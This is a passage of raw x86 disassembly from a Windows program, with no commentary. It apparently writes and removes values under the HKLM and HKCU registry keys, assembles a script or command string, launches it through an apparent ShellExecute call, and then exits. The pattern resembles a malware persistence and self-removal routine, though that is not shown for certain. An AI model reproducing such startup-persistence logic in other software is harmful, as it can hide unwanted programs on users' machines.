  4063b9:	68 70 0e 41 00       	push   $0x410e70
  4063be:	68 02 00 00 80       	push   $0x80000002
  4063c3:	e8 12 2c 00 00       	call   0x408fda
  4063c8:	83 c4 20             	add    $0x20,%esp
  4063cb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4063ce:	ff 15 54 02 41 00    	call   *0x410254
  4063d4:	80 7d 10 01          	cmpb   $0x1,0x10(%ebp)
  4063d8:	75 72                	jne    0x40644c
  4063da:	6a 01                	push   $0x1
  4063dc:	8d 45 0b             	lea    0xb(%ebp),%eax
  4063df:	83 ec 10             	sub    $0x10,%esp
  4063e2:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4063e5:	8b dc                	mov    %esp,%ebx
  4063e7:	56                   	push   %esi
  4063e8:	57                   	push   %edi
  4063e9:	56                   	push   %esi
  4063ea:	50                   	push   %eax
  4063eb:	68 60 0e 41 00       	push   $0x410e60
  4063f0:	ff 15 4c 02 41 00    	call   *0x41024c
  4063f6:	50                   	push   %eax
  4063f7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4063fa:	50                   	push   %eax
  4063fb:	e8 20 98 00 00       	call   0x40fc20
  406400:	83 c4 0c             	add    $0xc,%esp
  406403:	50                   	push   %eax
  406404:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406407:	50                   	push   %eax
  406408:	e8 07 98 00 00       	call   0x40fc14
  40640d:	83 c4 0c             	add    $0xc,%esp
  406410:	50                   	push   %eax
  406411:	53                   	push   %ebx
  406412:	e8 09 98 00 00       	call   0x40fc20
  406417:	83 c4 0c             	add    $0xc,%esp
  40641a:	68 58 0e 41 00       	push   $0x410e58
  40641f:	68 20 0e 41 00       	push   $0x410e20
  406424:	68 02 00 00 80       	push   $0x80000002
  406429:	e8 ac 2b 00 00       	call   0x408fda
  40642e:	83 c4 20             	add    $0x20,%esp
  406431:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406434:	ff 15 54 02 41 00    	call   *0x410254
  40643a:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40643d:	ff 15 54 02 41 00    	call   *0x410254
  406443:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406446:	ff 15 54 02 41 00    	call   *0x410254
  40644c:	80 7d 14 01          	cmpb   $0x1,0x14(%ebp)
  406450:	75 72                	jne    0x4064c4
  406452:	6a 01                	push   $0x1
  406454:	8d 45 0b             	lea    0xb(%ebp),%eax
  406457:	83 ec 10             	sub    $0x10,%esp
  40645a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40645d:	8b dc                	mov    %esp,%ebx
  40645f:	56                   	push   %esi
  406460:	57                   	push   %edi
  406461:	56                   	push   %esi
  406462:	50                   	push   %eax
  406463:	68 fc 0d 41 00       	push   $0x410dfc
  406468:	ff 15 4c 02 41 00    	call   *0x41024c
  40646e:	50                   	push   %eax
  40646f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406472:	50                   	push   %eax
  406473:	e8 a8 97 00 00       	call   0x40fc20
  406478:	83 c4 0c             	add    $0xc,%esp
  40647b:	50                   	push   %eax
  40647c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40647f:	50                   	push   %eax
  406480:	e8 8f 97 00 00       	call   0x40fc14
  406485:	83 c4 0c             	add    $0xc,%esp
  406488:	50                   	push   %eax
  406489:	53                   	push   %ebx
  40648a:	e8 91 97 00 00       	call   0x40fc20
  40648f:	83 c4 0c             	add    $0xc,%esp
  406492:	68 f0 0d 41 00       	push   $0x410df0
  406497:	68 20 0e 41 00       	push   $0x410e20
  40649c:	68 02 00 00 80       	push   $0x80000002
  4064a1:	e8 34 2b 00 00       	call   0x408fda
  4064a6:	83 c4 20             	add    $0x20,%esp
  4064a9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4064ac:	ff 15 54 02 41 00    	call   *0x410254
  4064b2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4064b5:	ff 15 54 02 41 00    	call   *0x410254
  4064bb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4064be:	ff 15 54 02 41 00    	call   *0x410254
  4064c4:	80 7d 18 01          	cmpb   $0x1,0x18(%ebp)
  4064c8:	75 3e                	jne    0x406508
  4064ca:	6a 01                	push   $0x1
  4064cc:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4064cf:	83 ec 10             	sub    $0x10,%esp
  4064d2:	8b dc                	mov    %esp,%ebx
  4064d4:	56                   	push   %esi
  4064d5:	57                   	push   %edi
  4064d6:	56                   	push   %esi
  4064d7:	50                   	push   %eax
  4064d8:	e8 3d 97 00 00       	call   0x40fc1a
  4064dd:	83 c4 0c             	add    $0xc,%esp
  4064e0:	50                   	push   %eax
  4064e1:	53                   	push   %ebx
  4064e2:	e8 39 97 00 00       	call   0x40fc20
  4064e7:	83 c4 0c             	add    $0xc,%esp
  4064ea:	ff 75 1c             	push   0x1c(%ebp)
  4064ed:	68 ac 0d 41 00       	push   $0x410dac
  4064f2:	68 02 00 00 80       	push   $0x80000002
  4064f7:	e8 de 2a 00 00       	call   0x408fda
  4064fc:	83 c4 20             	add    $0x20,%esp
  4064ff:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406502:	ff 15 54 02 41 00    	call   *0x410254
  406508:	5f                   	pop    %edi
  406509:	5e                   	pop    %esi
  40650a:	5b                   	pop    %ebx
  40650b:	c9                   	leave
  40650c:	c3                   	ret
  40650d:	55                   	push   %ebp
  40650e:	8b ec                	mov    %esp,%ebp
  406510:	81 ec fc 00 00 00    	sub    $0xfc,%esp
  406516:	53                   	push   %ebx
  406517:	56                   	push   %esi
  406518:	57                   	push   %edi
  406519:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40651c:	83 c9 ff             	or     $0xffffffff,%ecx
  40651f:	33 c0                	xor    %eax,%eax
  406521:	f2 ae                	repnz scas %es:(%edi),%al
  406523:	f7 d1                	not    %ecx
  406525:	49                   	dec    %ecx
  406526:	74 55                	je     0x40657d
  406528:	50                   	push   %eax
  406529:	b9 18 59 41 00       	mov    $0x415918,%ecx
  40652e:	ff 15 58 02 41 00    	call   *0x410258
  406534:	50                   	push   %eax
  406535:	ff 15 84 01 41 00    	call   *0x410184
  40653b:	ff 75 10             	push   0x10(%ebp)
  40653e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406541:	68 cc 08 41 00       	push   $0x4108cc
  406546:	68 18 59 41 00       	push   $0x415918
  40654b:	50                   	push   %eax
  40654c:	e8 cf 96 00 00       	call   0x40fc20
  406551:	83 c4 0c             	add    $0xc,%esp
  406554:	50                   	push   %eax
  406555:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406558:	50                   	push   %eax
  406559:	e8 c2 96 00 00       	call   0x40fc20
  40655e:	83 c4 0c             	add    $0xc,%esp
  406561:	be d0 57 41 00       	mov    $0x4157d0,%esi
  406566:	8b ce                	mov    %esi,%ecx
  406568:	50                   	push   %eax
  406569:	ff 15 64 02 41 00    	call   *0x410264
  40656f:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406572:	ff 15 54 02 41 00    	call   *0x410254
  406578:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40657b:	eb 23                	jmp    0x4065a0
  40657d:	ff 75 10             	push   0x10(%ebp)
  406580:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406583:	ff 75 08             	push   0x8(%ebp)
  406586:	50                   	push   %eax
  406587:	e8 a3 0b 00 00       	call   0x40712f
  40658c:	83 c4 0c             	add    $0xc,%esp
  40658f:	be d0 57 41 00       	mov    $0x4157d0,%esi
  406594:	8b ce                	mov    %esi,%ecx
  406596:	50                   	push   %eax
  406597:	ff 15 64 02 41 00    	call   *0x410264
  40659d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4065a0:	ff 15 54 02 41 00    	call   *0x410254
  4065a6:	8b ce                	mov    %esi,%ecx
  4065a8:	ff 15 58 02 41 00    	call   *0x410258
  4065ae:	bb 0c 58 41 00       	mov    $0x41580c,%ebx
  4065b3:	8b fb                	mov    %ebx,%edi
  4065b5:	8a 17                	mov    (%edi),%dl
  4065b7:	8a ca                	mov    %dl,%cl
  4065b9:	3a 10                	cmp    (%eax),%dl
  4065bb:	75 1a                	jne    0x4065d7
  4065bd:	84 c9                	test   %cl,%cl
  4065bf:	74 12                	je     0x4065d3
  4065c1:	8a 57 01             	mov    0x1(%edi),%dl
  4065c4:	8a ca                	mov    %dl,%cl
  4065c6:	3a 50 01             	cmp    0x1(%eax),%dl
  4065c9:	75 0c                	jne    0x4065d7
  4065cb:	47                   	inc    %edi
  4065cc:	47                   	inc    %edi
  4065cd:	40                   	inc    %eax
  4065ce:	40                   	inc    %eax
  4065cf:	84 c9                	test   %cl,%cl
  4065d1:	75 e2                	jne    0x4065b5
  4065d3:	33 c0                	xor    %eax,%eax
  4065d5:	eb 05                	jmp    0x4065dc
  4065d7:	1b c0                	sbb    %eax,%eax
  4065d9:	83 d8 ff             	sbb    $0xffffffff,%eax
  4065dc:	85 c0                	test   %eax,%eax
  4065de:	75 39                	jne    0x406619
  4065e0:	b9 f8 57 41 00       	mov    $0x4157f8,%ecx
  4065e5:	ff 15 58 02 41 00    	call   *0x410258
  4065eb:	50                   	push   %eax
  4065ec:	a0 c8 57 41 00       	mov    0x4157c8,%al
  4065f1:	50                   	push   %eax
  4065f2:	a0 e0 57 41 00       	mov    0x4157e0,%al
  4065f7:	50                   	push   %eax
  4065f8:	a0 10 59 41 00       	mov    0x415910,%al
  4065fd:	50                   	push   %eax
  4065fe:	a0 11 59 41 00       	mov    0x415911,%al
  406603:	50                   	push   %eax
  406604:	a0 08 58 41 00       	mov    0x415808,%al
  406609:	50                   	push   %eax
  40660a:	e8 2a fd ff ff       	call   0x406339
  40660f:	83 c4 18             	add    $0x18,%esp
  406612:	b0 01                	mov    $0x1,%al
  406614:	e9 6a 03 00 00       	jmp    0x406983
  406619:	6a 00                	push   $0x0
  40661b:	8b ce                	mov    %esi,%ecx
  40661d:	ff 15 58 02 41 00    	call   *0x410258
  406623:	50                   	push   %eax
  406624:	53                   	push   %ebx
  406625:	ff 15 cc 00 41 00    	call   *0x4100cc
  40662b:	85 c0                	test   %eax,%eax
  40662d:	0f 85 b0 00 00 00    	jne    0x4066e3
  406633:	80 7d 08 36          	cmpb   $0x36,0x8(%ebp)
  406637:	0f 84 a6 00 00 00    	je     0x4066e3
  40663d:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406640:	83 c9 ff             	or     $0xffffffff,%ecx
  406643:	f2 ae                	repnz scas %es:(%edi),%al
  406645:	ff 75 10             	push   0x10(%ebp)
  406648:	f7 d1                	not    %ecx
  40664a:	49                   	dec    %ecx
  40664b:	74 50                	je     0x40669d
  40664d:	68 cc 08 41 00       	push   $0x4108cc
  406652:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406655:	ff 75 0c             	push   0xc(%ebp)
  406658:	6a 36                	push   $0x36
  40665a:	50                   	push   %eax
  40665b:	e8 cf 0a 00 00       	call   0x40712f
  406660:	83 c4 0c             	add    $0xc,%esp
  406663:	50                   	push   %eax
  406664:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406667:	50                   	push   %eax
  406668:	e8 b3 95 00 00       	call   0x40fc20
  40666d:	83 c4 0c             	add    $0xc,%esp
  406670:	50                   	push   %eax
  406671:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406674:	50                   	push   %eax
  406675:	e8 a6 95 00 00       	call   0x40fc20
  40667a:	83 c4 0c             	add    $0xc,%esp
  40667d:	8b ce                	mov    %esi,%ecx
  40667f:	50                   	push   %eax
  406680:	ff 15 64 02 41 00    	call   *0x410264
  406686:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406689:	ff 15 54 02 41 00    	call   *0x410254
  40668f:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406692:	ff 15 54 02 41 00    	call   *0x410254
  406698:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40669b:	eb 1a                	jmp    0x4066b7
  40669d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4066a0:	6a 36                	push   $0x36
  4066a2:	50                   	push   %eax
  4066a3:	e8 87 0a 00 00       	call   0x40712f
  4066a8:	83 c4 0c             	add    $0xc,%esp
  4066ab:	8b ce                	mov    %esi,%ecx
  4066ad:	50                   	push   %eax
  4066ae:	ff 15 64 02 41 00    	call   *0x410264
  4066b4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4066b7:	ff 15 54 02 41 00    	call   *0x410254
  4066bd:	6a 00                	push   $0x0
  4066bf:	8b ce                	mov    %esi,%ecx
  4066c1:	ff 15 58 02 41 00    	call   *0x410258
  4066c7:	50                   	push   %eax
  4066c8:	53                   	push   %ebx
  4066c9:	ff 15 cc 00 41 00    	call   *0x4100cc
  4066cf:	85 c0                	test   %eax,%eax
  4066d1:	75 10                	jne    0x4066e3
  4066d3:	53                   	push   %ebx
  4066d4:	8b ce                	mov    %esi,%ecx
  4066d6:	ff 15 d8 02 41 00    	call   *0x4102d8
  4066dc:	32 c0                	xor    %al,%al
  4066de:	e9 a0 02 00 00       	jmp    0x406983
  4066e3:	b9 f8 57 41 00       	mov    $0x4157f8,%ecx
  4066e8:	ff 15 58 02 41 00    	call   *0x410258
  4066ee:	50                   	push   %eax
  4066ef:	a0 c8 57 41 00       	mov    0x4157c8,%al
  4066f4:	50                   	push   %eax
  4066f5:	a0 e0 57 41 00       	mov    0x4157e0,%al
  4066fa:	50                   	push   %eax
  4066fb:	a0 10 59 41 00       	mov    0x415910,%al
  406700:	50                   	push   %eax
  406701:	a0 11 59 41 00       	mov    0x415911,%al
  406706:	50                   	push   %eax
  406707:	a0 08 58 41 00       	mov    0x415808,%al
  40670c:	50                   	push   %eax
  40670d:	e8 27 fc ff ff       	call   0x406339
  406712:	83 c4 18             	add    $0x18,%esp
  406715:	80 7d 14 01          	cmpb   $0x1,0x14(%ebp)
  406719:	75 32                	jne    0x40674d
  40671b:	6a 07                	push   $0x7
  40671d:	8b ce                	mov    %esi,%ecx
  40671f:	ff 15 58 02 41 00    	call   *0x410258
  406725:	8b 35 60 01 41 00    	mov    0x410160,%esi
  40672b:	50                   	push   %eax
  40672c:	ff d6                	call   *%esi
  40672e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406731:	83 c9 ff             	or     $0xffffffff,%ecx
  406734:	33 c0                	xor    %eax,%eax
  406736:	f2 ae                	repnz scas %es:(%edi),%al
  406738:	f7 d1                	not    %ecx
  40673a:	49                   	dec    %ecx
  40673b:	74 10                	je     0x40674d
  40673d:	6a 07                	push   $0x7
  40673f:	b9 18 59 41 00       	mov    $0x415918,%ecx
  406744:	ff 15 58 02 41 00    	call   *0x410258
  40674a:	50                   	push   %eax
  40674b:	ff d6                	call   *%esi
  40674d:	8d 45 17             	lea    0x17(%ebp),%eax
  406750:	68 ec 0e 41 00       	push   $0x410eec
  406755:	50                   	push   %eax
  406756:	68 e4 0e 41 00       	push   $0x410ee4
  40675b:	ff 15 64 03 41 00    	call   *0x410364
  406761:	59                   	pop    %ecx
  406762:	50                   	push   %eax
  406763:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406766:	ff 15 4c 02 41 00    	call   *0x41024c
  40676c:	50                   	push   %eax
  40676d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406770:	50                   	push   %eax
  406771:	e8 aa 94 00 00       	call   0x40fc20
  406776:	83 c4 0c             	add    $0xc,%esp
  406779:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40677c:	50                   	push   %eax
  40677d:	ff 15 60 02 41 00    	call   *0x410260
  406783:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406786:	ff 15 54 02 41 00    	call   *0x410254
  40678c:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40678f:	ff 15 54 02 41 00    	call   *0x410254
  406795:	6a 01                	push   $0x1
  406797:	6a 10                	push   $0x10
  406799:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40679c:	ff 15 58 02 41 00    	call   *0x410258
  4067a2:	50                   	push   %eax
  4067a3:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  4067a9:	ff 15 2c 02 41 00    	call   *0x41022c
  4067af:	8b 3d 1c 02 41 00    	mov    0x41021c,%edi
  4067b5:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  4067bb:	68 cc 0e 41 00       	push   $0x410ecc
  4067c0:	50                   	push   %eax
  4067c1:	ff d7                	call   *%edi
  4067c3:	80 7d 18 01          	cmpb   $0x1,0x18(%ebp)
  4067c7:	59                   	pop    %ecx
  4067c8:	59                   	pop    %ecx
  4067c9:	bb c8 0e 41 00       	mov    $0x410ec8,%ebx
  4067ce:	be 60 08 41 00       	mov    $0x410860,%esi
  4067d3:	0f 85 9f 00 00 00    	jne    0x406878
  4067d9:	53                   	push   %ebx
  4067da:	8d 45 17             	lea    0x17(%ebp),%eax
  4067dd:	56                   	push   %esi
  4067de:	50                   	push   %eax
  4067df:	68 0c 58 41 00       	push   $0x41580c
  4067e4:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4067e7:	ff 15 4c 02 41 00    	call   *0x41024c
  4067ed:	50                   	push   %eax
  4067ee:	8d 45 1b             	lea    0x1b(%ebp),%eax
  4067f1:	56                   	push   %esi
  4067f2:	50                   	push   %eax
  4067f3:	68 c0 0e 41 00       	push   $0x410ec0
  4067f8:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4067fb:	ff 15 4c 02 41 00    	call   *0x41024c
  406801:	50                   	push   %eax
  406802:	8d 45 b0             	lea    -0x50(%ebp),%eax
  406805:	50                   	push   %eax
  406806:	e8 15 94 00 00       	call   0x40fc20
  40680b:	83 c4 0c             	add    $0xc,%esp
  40680e:	50                   	push   %eax
  40680f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406812:	50                   	push   %eax
  406813:	e8 fc 93 00 00       	call   0x40fc14
  406818:	83 c4 0c             	add    $0xc,%esp
  40681b:	50                   	push   %eax
  40681c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40681f:	50                   	push   %eax
  406820:	e8 fb 93 00 00       	call   0x40fc20
  406825:	83 c4 0c             	add    $0xc,%esp
  406828:	50                   	push   %eax
  406829:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40682c:	50                   	push   %eax
  40682d:	e8 ee 93 00 00       	call   0x40fc20
  406832:	50                   	push   %eax
  406833:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  406839:	50                   	push   %eax
  40683a:	e8 0b 94 00 00       	call   0x40fc4a
  40683f:	83 c4 14             	add    $0x14,%esp
  406842:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406845:	ff 15 54 02 41 00    	call   *0x410254
  40684b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40684e:	ff 15 54 02 41 00    	call   *0x410254
  406854:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406857:	ff 15 54 02 41 00    	call   *0x410254
  40685d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406860:	ff 15 54 02 41 00    	call   *0x410254
  406866:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  406869:	ff 15 54 02 41 00    	call   *0x410254
  40686f:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  406872:	ff 15 54 02 41 00    	call   *0x410254
  406878:	8d 45 17             	lea    0x17(%ebp),%eax
  40687b:	53                   	push   %ebx
  40687c:	50                   	push   %eax
  40687d:	56                   	push   %esi
  40687e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406881:	ff 15 4c 02 41 00    	call   *0x41024c
  406887:	50                   	push   %eax
  406888:	68 d0 57 41 00       	push   $0x4157d0
  40688d:	8d 45 1b             	lea    0x1b(%ebp),%eax
  406890:	56                   	push   %esi
  406891:	50                   	push   %eax
  406892:	68 b4 0e 41 00       	push   $0x410eb4
  406897:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40689a:	ff 15 4c 02 41 00    	call   *0x41024c
  4068a0:	50                   	push   %eax
  4068a1:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4068a4:	50                   	push   %eax
  4068a5:	e8 76 93 00 00       	call   0x40fc20
  4068aa:	83 c4 0c             	add    $0xc,%esp
  4068ad:	50                   	push   %eax
  4068ae:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4068b1:	50                   	push   %eax
  4068b2:	e8 5d 93 00 00       	call   0x40fc14
  4068b7:	83 c4 0c             	add    $0xc,%esp
  4068ba:	50                   	push   %eax
  4068bb:	8d 45 90             	lea    -0x70(%ebp),%eax
  4068be:	50                   	push   %eax
  4068bf:	e8 50 93 00 00       	call   0x40fc14
  4068c4:	83 c4 0c             	add    $0xc,%esp
  4068c7:	50                   	push   %eax
  4068c8:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4068cb:	50                   	push   %eax
  4068cc:	e8 4f 93 00 00       	call   0x40fc20
  4068d1:	50                   	push   %eax
  4068d2:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  4068d8:	50                   	push   %eax
  4068d9:	e8 6c 93 00 00       	call   0x40fc4a
  4068de:	83 c4 14             	add    $0x14,%esp
  4068e1:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4068e4:	ff 15 54 02 41 00    	call   *0x410254
  4068ea:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4068ed:	ff 15 54 02 41 00    	call   *0x410254
  4068f3:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4068f6:	ff 15 54 02 41 00    	call   *0x410254
  4068fc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4068ff:	ff 15 54 02 41 00    	call   *0x410254
  406905:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406908:	ff 15 54 02 41 00    	call   *0x410254
  40690e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406911:	ff 15 54 02 41 00    	call   *0x410254
  406917:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  40691d:	68 a8 0e 41 00       	push   $0x410ea8
  406922:	50                   	push   %eax
  406923:	ff d7                	call   *%edi
  406925:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  40692b:	68 a0 0e 41 00       	push   $0x410ea0
  406930:	50                   	push   %eax
  406931:	ff d7                	call   *%edi
  406933:	83 c4 10             	add    $0x10,%esp
  406936:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40693c:	ff 15 fc 02 41 00    	call   *0x4102fc
  406942:	33 f6                	xor    %esi,%esi
  406944:	b8 68 06 41 00       	mov    $0x410668,%eax
  406949:	56                   	push   %esi
  40694a:	50                   	push   %eax
  40694b:	50                   	push   %eax
  40694c:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40694f:	ff 15 58 02 41 00    	call   *0x410258
  406955:	50                   	push   %eax
  406956:	68 18 07 41 00       	push   $0x410718
  40695b:	56                   	push   %esi
  40695c:	ff 15 bc 03 41 00    	call   *0x4103bc
  406962:	83 f8 20             	cmp    $0x20,%eax
  406965:	76 07                	jbe    0x40696e
  406967:	56                   	push   %esi
  406968:	ff 15 ac 03 41 00    	call   *0x4103ac
  40696e:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  406974:	ff 15 f8 02 41 00    	call   *0x4102f8
  40697a:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40697d:	ff 15 54 02 41 00    	call   *0x410254
  406983:	5f                   	pop    %edi
  406984:	5e                   	pop    %esi
  406985:	5b                   	pop    %ebx
  406986:	c9                   	leave
  406987:	c3                   	ret
  406988:	55                   	push   %ebp
  406989:	8b ec                	mov    %esp,%ebp
  40698b:	81 ec d4 01 00 00    	sub    $0x1d4,%esp
  406991:	80 3d f8 56 41 00 01 	cmpb   $0x1,0x4156f8
  406998:	53                   	push   %ebx
  406999:	56                   	push   %esi
  40699a:	57                   	push   %edi
  40699b:	75 0a                	jne    0x4069a7
  40699d:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  4069a2:	e8 a7 e8 ff ff       	call   0x40524e
  4069a7:	80 3d 64 5b 41 00 01 	cmpb   $0x1,0x415b64
  4069ae:	75 05                	jne    0x4069b5
  4069b0:	e8 f6 7a 00 00       	call   0x40e4ab
  4069b5:	80 3d 08 58 41 00 01 	cmpb   $0x1,0x415808
  4069bc:	bb f8 57 41 00       	mov    $0x4157f8,%ebx
  4069c1:	bf 70 0e 41 00       	mov    $0x410e70,%edi
  4069c6:	75 17                	jne    0x4069df
  4069c8:	8b cb                	mov    %ebx,%ecx
  4069ca:	ff 15 58 02 41 00    	call   *0x410258
  4069d0:	50                   	push   %eax
  4069d1:	57                   	push   %edi
  4069d2:	68 01 00 00 80       	push   $0x80000001
  4069d7:	e8 56 27 00 00       	call   0x409132
  4069dc:	83 c4 0c             	add    $0xc,%esp
  4069df:	80 3d 11 59 41 00 01 	cmpb   $0x1,0x415911
  4069e6:	be 02 00 00 80       	mov    $0x80000002,%esi
  4069eb:	75 13                	jne    0x406a00
  4069ed:	8b cb                	mov    %ebx,%ecx
  4069ef:	ff 15 58 02 41 00    	call   *0x410258
  4069f5:	50                   	push   %eax
  4069f6:	57                   	push   %edi
  4069f7:	56                   	push   %esi
  4069f8:	e8 35 27 00 00       	call   0x409132
  4069fd:	83 c4 0c             	add    $0xc,%esp
  406a00:	80 3d 10 59 41 00 01 	cmpb   $0x1,0x415910
  406a07:	bf 20 0e 41 00       	mov    $0x410e20,%edi
  406a0c:	75 25                	jne    0x406a33
  406a0e:	6a 01                	push   $0x1
  406a10:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406a13:	83 ec 10             	sub    $0x10,%esp
  406a16:	8b cc                	mov    %esp,%ecx
  406a18:	50                   	push   %eax
  406a19:	68 78 0f 41 00       	push   $0x410f78
  406a1e:	ff 15 4c 02 41 00    	call   *0x41024c
  406a24:	68 58 0e 41 00       	push   $0x410e58
  406a29:	57                   	push   %edi
  406a2a:	56                   	push   %esi
  406a2b:	e8 aa 25 00 00       	call   0x408fda
  406a30:	83 c4 20             	add    $0x20,%esp
  406a33:	80 3d e0 57 41 00 01 	cmpb   $0x1,0x4157e0
  406a3a:	75 25                	jne    0x406a61
  406a3c:	6a 01                	push   $0x1
  406a3e:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406a41:	83 ec 10             	sub    $0x10,%esp
  406a44:	8b cc                	mov    %esp,%ecx
  406a46:	50                   	push   %eax
  406a47:	68 54 0f 41 00       	push   $0x410f54
  406a4c:	ff 15 4c 02 41 00    	call   *0x41024c
  406a52:	68 f0 0d 41 00       	push   $0x410df0
  406a57:	57                   	push   %edi
  406a58:	56                   	push   %esi
  406a59:	e8 7c 25 00 00       	call   0x408fda
  406a5e:	83 c4 20             	add    $0x20,%esp
  406a61:	80 3d c8 57 41 00 01 	cmpb   $0x1,0x4157c8
  406a68:	75 17                	jne    0x406a81
  406a6a:	8b cb                	mov    %ebx,%ecx
  406a6c:	ff 15 58 02 41 00    	call   *0x410258
  406a72:	50                   	push   %eax
  406a73:	68 ac 0d 41 00       	push   $0x410dac
  406a78:	56                   	push   %esi
  406a79:	e8 b4 26 00 00       	call   0x409132
  406a7e:	83 c4 0c             	add    $0xc,%esp
  406a81:	80 a5 2c fe ff ff 00 	andb   $0x0,-0x1d4(%ebp)
  406a88:	6a 40                	push   $0x40
  406a8a:	59                   	pop    %ecx
  406a8b:	33 c0                	xor    %eax,%eax
  406a8d:	8d bd 2d fe ff ff    	lea    -0x1d3(%ebp),%edi
  406a93:	be 50 59 41 00       	mov    $0x415950,%esi
  406a98:	f3 ab                	rep stos %eax,%es:(%edi)
  406a9a:	66 ab                	stos   %ax,%es:(%edi)
  406a9c:	8b ce                	mov    %esi,%ecx
  406a9e:	aa                   	stos   %al,%es:(%edi)
  406a9f:	ff 15 90 02 41 00    	call   *0x410290
  406aa5:	50                   	push   %eax
  406aa6:	8b ce                	mov    %esi,%ecx
  406aa8:	ff 15 58 02 41 00    	call   *0x410258
  406aae:	50                   	push   %eax
  406aaf:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406ab5:	be e8 57 41 00       	mov    $0x4157e8,%esi
  406aba:	50                   	push   %eax
  406abb:	68 4c 0f 41 00       	push   $0x410f4c
  406ac0:	8b ce                	mov    %esi,%ecx
  406ac2:	ff 15 58 02 41 00    	call   *0x410258
  406ac8:	bf 01 00 00 80       	mov    $0x80000001,%edi
  406acd:	50                   	push   %eax
  406ace:	57                   	push   %edi
  406acf:	e8 90 24 00 00       	call   0x408f64
  406ad4:	83 c4 18             	add    $0x18,%esp
  406ad7:	84 c0                	test   %al,%al
  406ad9:	75 16                	jne    0x406af1
  406adb:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  406ae1:	68 04 01 00 00       	push   $0x104
  406ae6:	50                   	push   %eax
  406ae7:	6a 00                	push   $0x0
  406ae9:	ff 15 6c 00 41 00    	call   *0x41006c
  406aef:	eb 10                	jmp    0x406b01
  406af1:	8b ce                	mov    %esi,%ecx
  406af3:	ff 15 58 02 41 00    	call   *0x410258
  406af9:	50                   	push   %eax
  406afa:	57                   	push   %edi
  406afb:	ff 15 2c 00 41 00    	call   *0x41002c
  406b01:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406b04:	68 3c 0f 41 00       	push   $0x410f3c
  406b09:	50                   	push   %eax
  406b0a:	68 e4 0e 41 00       	push   $0x410ee4
  406b0f:	ff 15 64 03 41 00    	call   *0x410364
  406b15:	59                   	pop    %ecx
  406b16:	50                   	push   %eax
  406b17:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406b1a:	ff 15 4c 02 41 00    	call   *0x41024c
  406b20:	50                   	push   %eax
